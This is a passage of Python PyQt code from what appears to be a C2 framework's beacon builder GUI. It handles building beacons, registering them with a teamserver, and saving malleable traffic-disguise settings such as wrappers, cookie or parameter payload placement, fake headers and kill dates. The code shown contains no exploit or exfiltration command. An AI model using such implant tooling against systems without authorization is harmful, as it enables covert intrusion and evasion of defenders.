            html += f'\n<span style="color: #9cdcfe;">Content-Length</span>: <span style="color: #ce9178;">{len(body)}</span>'
        html += "\n"
        if body:
            html += f'\n<span style="color: #dcdcaa;">{body[:200]}{"..." if len(body) > 200 else ""}</span>'

        self._preview_text.setHtml(html)

    # ── Tab 6: Build ────────────────────────────────────────────────

    def _build_build_tab(self) -> QWidget:
        tab = QWidget()
        tab.setObjectName("configTab")
        layout = QVBoxLayout(tab)

        # Build button + progress bar
        controls = QHBoxLayout()
        self._build_btn = QPushButton("Build Beacon")
        self._build_btn.setObjectName("BuildBtn")
        self._build_btn.clicked.connect(self._run_build)
        controls.addWidget(self._build_btn)

        self._build_progress = QProgressBar()
        self._build_progress.setRange(0, 0)  # indeterminate
        self._build_progress.setVisible(False)
        self._build_progress.setMaximumWidth(200)
        controls.addWidget(self._build_progress)

        self._upload_btn = QPushButton("Upload Config to Server")
        self._upload_btn.setObjectName("UploadBtn")
        self._upload_btn.clicked.connect(self._upload_to_server)
        self._upload_btn.setEnabled(False)
        controls.addWidget(self._upload_btn)

        controls.addStretch()
        layout.addLayout(controls)

        # Build output
        self._build_output_text = QTextEdit()
        self._build_output_text.setReadOnly(True)
        self._build_output_text.setFont(QFont("Consolas", 9))
        layout.addWidget(self._build_output_text)

        return tab

    def _upload_to_server(self):
        """Upload the current beacon config to the connected teamserver."""
        if not self._api or not self._api.is_connected():
            self._append_build("ERROR: Not connected to a teamserver")
            return

        self._sync_form_to_config()
        config = self._config

        beacon_id = config.get("beacon_id", "")
        crypto_key = config.get("crypto_key", "")
        if not beacon_id or not crypto_key:
            self._append_build("ERROR: Build the config first (generates beacon_id / crypto_key)")
            return

        channels = config.get("c2_channels", [])
        if not channels:
            self._append_build("ERROR: No C2 channels configured")
            return

        allowed_routes = []
        for ch in channels:
            ch_type = ch.get("type", "HTTP")

            def _resolve_mc(block_key):
                mc = ch.get(block_key)
                if mc:
                    return mc
                mc = config.get(block_key)
                if mc:
                    return mc
                return None

            poll_mc = _resolve_mc("poll_malleable_config")
            submit_mc = _resolve_mc("submit_malleable_config")
            poll_resp_mc = _resolve_mc("poll_response_malleable_config")
            submit_resp_mc = _resolve_mc("submit_response_malleable_config")

            is_tcp = ch_type in ("TCP", "PIPE")
            if is_tcp:
                poll_mc = {"wrapper": poll_mc.get("wrapper")} if poll_mc and poll_mc.get("wrapper") else None
                submit_mc = {"wrapper": submit_mc.get("wrapper")} if submit_mc and submit_mc.get("wrapper") else None

            allowed_routes.append({
                "transport_type": ch_type,
                "poll_path": ch.get("poll_path", ""),
                "submit_path": ch.get("submit_path", ""),
                "port": ch.get("port", 0),
                "host": ch.get("host", ""),
                "user_agent": ch.get("user_agent", ""),
                "poll_malleable_config": poll_mc,
                "submit_malleable_config": submit_mc,
                "poll_response_malleable_config": poll_resp_mc,
                "submit_response_malleable_config": submit_resp_mc,
            })

        self._append_build(f"Uploading beacon {beacon_id[:16]} to server ({len(allowed_routes)} route(s))...")
        QApplication.processEvents()

        try:
            result = self._api.register_beacon(beacon_id, crypto_key, allowed_routes)
            if result.get("success"):
                self._append_build(f"OK: Beacon registered on server ({result.get('message', '')})")
                self._status_label.setText("Config uploaded to server")
            else:
                self._append_build(f"ERROR: {result.get('error', 'Unknown error')}")
        except Exception as e:
            self._append_build(f"ERROR: Upload failed: {e}")

    def _run_build(self):
        """Collect form values and run build in a background thread."""
        self._sync_form_to_config()

        channels = self._config.get("c2_channels", [])
        if not channels:
            QMessageBox.warning(self, "Build Error", "At least one C2 channel is required.")
            return

        self._build_output = ""
        self._build_output_text.clear()

        self._build_btn.setEnabled(False)
        self._upload_btn.setEnabled(False)
        self._build_progress.setVisible(True)

        self._worker = _BuildWorker(self._config, self)
        self._thread = QThread(self)
        self._worker.moveToThread(self._thread)
        self._thread.started.connect(self._worker.run)
        self._worker.progress.connect(self._on_build_progress)
        self._worker.error.connect(self._on_build_error)
        self._worker.finished.connect(self._on_build_finished)
        self._thread.start()

    def _on_build_progress(self, text: str):
        self._append_build(text)

    def _on_build_error(self, text: str):
        self._append_build(f"ERROR: {text}")

    def _on_build_finished(self):
        self._thread.quit()
        self._thread.wait()
        self._build_btn.setEnabled(True)
        self._build_progress.setVisible(False)
        self._upload_btn.setEnabled(self._api is not None and self._api.is_connected())

    def _append_build(self, text: str):
        self._build_output += text + "\n"
        self._build_output_text.append(text)
        cursor = self._build_output_text.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self._build_output_text.setTextCursor(cursor)

    # ── Config I/O ──────────────────────────────────────────────────

    def _sync_form_to_config(self):
        """Pull current widget values into self._config dict using schema field map."""
        c = self._config

        for path, w in self._fields.items():
            val = _schema_widget_value(w)
            parts = path.split(".")
            parent = c
            for p in parts[:-1]:
                parent = parent.setdefault(p, {})
            parent[parts[-1]] = val

        # Kill date (special: QDateEdit)
        kd = self._kill_date.date()
        if kd.isValid() and kd != QDate.currentDate().addYears(1):
            dt = datetime(kd.year(), kd.month(), kd.day(), tzinfo=timezone.utc)
            c["kill_date"] = dt.strftime("%Y-%m-%d")
        else:
            c["kill_date"] = ""

        # Malleable (per-channel + global) — save current tab fields
        self._save_current_malleable_fields()

        # Post-build + in-memory append
        c["post_build"] = {"append": [self._post_append_list.item(i).text() for i in range(self._post_append_list.count())]}
        c["in_memory_append"] = {"append": [self._inmem_append_list.item(i).text() for i in range(self._inmem_append_list.count())]}

    def _save_current_malleable_fields(self):
        """Write current malleable tab UI fields into the targeted config block."""
        mc, _, block_key, is_response = self._get_malleable_target()
        mc.setdefault("wrapper", {})
        mc["wrapper"]["prefix"] = self._wrap_prefix.text().strip()
        mc["wrapper"]["suffix"] = self._wrap_suffix.text().strip()
        mc.setdefault("payload_location", {})
        mc["payload_location"]["type"] = self._pl_type.currentText()
        mc["payload_location"]["param_name"] = self._pl_param.text().strip()
        mc["payload_location"]["path_prefix"] = self._pl_path_prefix.text().strip()
        mc["payload_location"]["path_suffix"] = self._pl_path_suffix.text().strip()
        mc["payload_location"]["body_content_type"] = self._pl_body_ct.currentText()
        mc["payload_location"]["cookie_name"] = self._pl_cookie.text().strip()

        # Save HTTP headers table
        headers = []
        for i in range(self._headers_table.rowCount()):
            name_item = self._headers_table.item(i, 0)
            val_item = self._headers_table.item(i, 1)
            if name_item and name_item.text().strip():
                headers.append({
                    "name": name_item.text().strip(),
                    "value": val_item.text().strip() if val_item else "",
                })
        if headers:
            mc["http_headers"] = headers
        else:
            mc.pop("http_headers", None)

        if is_response:
            mc["status_code"] = self._resp_status_code.value()
            bt = self._resp_body_template.text().strip()
            if bt:
                mc["body_template"] = bt
            else:
                mc.pop("body_template", None)
            hdrs = {}
            for i in range(self._resp_headers_table.rowCount()):
                name_item = self._resp_headers_table.item(i, 0)
                val_item = self._resp_headers_table.item(i, 1)
                if name_item and name_item.text().strip():
                    hdrs[name_item.text().strip()] = val_item.text().strip() if val_item else ""
            mc["headers"] = hdrs

        # Clean up empty blocks
        if not mc.get("wrapper", {}).get("prefix") and not mc.get("wrapper", {}).get("suffix"):
            mc.pop("wrapper", None)
        if not mc.get("http_headers"):
            mc.pop("http_headers", None)
        if not mc.get("payload_location", {}).get("type"):
            mc.pop("payload_location", None)
        if not mc:
            # Remove the block key entirely if empty (revert to global)
            parent = self._config
            # Find the parent that contains this block key
            for ch in self._config.get("c2_channels", []):
                if block_key in ch and ch[block_key] is mc:
                    parent = ch
                    break
            parent.pop(block_key, None)

    def _sync_config_to_form(self):
        """Populate widget values from self._config dict using schema field map."""
        c = self._config

        for path, w in self._fields.items():
            parts = path.split(".")
            parent = c
            for p in parts[:-1]:
                parent = parent.get(p, {})
            val = parent.get(parts[-1])
            _schema_widget_set(w, val)

        # Kill date
        kd_str = c.get("kill_date", "")
        if kd_str:
            try:
                dt = datetime.strptime(kd_str, "%Y-%m-%d")
                self._kill_date.setDate(QDate(dt.year, dt.month, dt.day))
            except ValueError:
                self._kill_date.setDate(QDate.currentDate().addYears(1))
        else:
            self._kill_date.setDate(QDate.currentDate().addYears(1))

        # Malleable
        self._populate_malleable_channels()
        self._refresh_malleable_fields()
        self._update_conditional_visibility()

        # Post-build + in-memory append
        self._post_append_list.clear()
        for s in c.get("post_build", {}).get("append", []):
            self._post_append_list.addItem(s)
        self._inmem_append_list.clear()
        for s in c.get("in_memory_append", {}).get("append", []):
            self._inmem_append_list.addItem(s)

        # Refresh complex widgets
        self._refresh_channels_table()
        self._refresh_chain_stack()
        self._refresh_headers_table()
        self._refresh_resp_headers_table()

    def _load_config(self):
        """Load config from a JSON file."""
        path, _ = QFileDialog.getOpenFileName(
            self, "Load Config", _default_json_path(),
            "JSON Files (*.json);;All Files (*)",
        )
        if not path:
            return
        try:
            with open(path, "r") as f:
                data = json.load(f)
            self._config = data
            self._config_path = path
            self._sync_config_to_form()
            self._status_label.setText(f"Loaded: {os.path.basename(path)}")
            self._tabs.setCurrentIndex(0)
        except Exception as e:
            QMessageBox.critical(self, "Load Error", str(e))

    def _save_config(self):
        """Save current config to a JSON file."""
        if not self._config_path:
            path, _ = QFileDialog.getSaveFileName(
                self, "Save Config", _default_json_path(),
                "JSON Files (*.json);;All Files (*)",
            )
            if not path:
                return
            self._config_path = path
        self._sync_form_to_config()
        try:
            with open(self._config_path, "w") as f:
                json.dump(self._config, f, indent=2)
            self._status_label.setText(f"Saved: {os.path.basename(self._config_path)}")
        except Exception as e:
            QMessageBox.critical(self, "Save Error", str(e))

    def _reset_config(self):
        """Reset config to defaults."""
        reply = QMessageBox.question(
            self, "Reset",
            "Reset all config fields to defaults?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return
        self._config_path = None
        self._build_output = ""
        self._build_output_text.clear()
        self._config = json.loads(json.dumps(_DEFAULT_CONFIG))
        self._sync_config_to_form()
        self._status_label.setText("Defaults loaded")
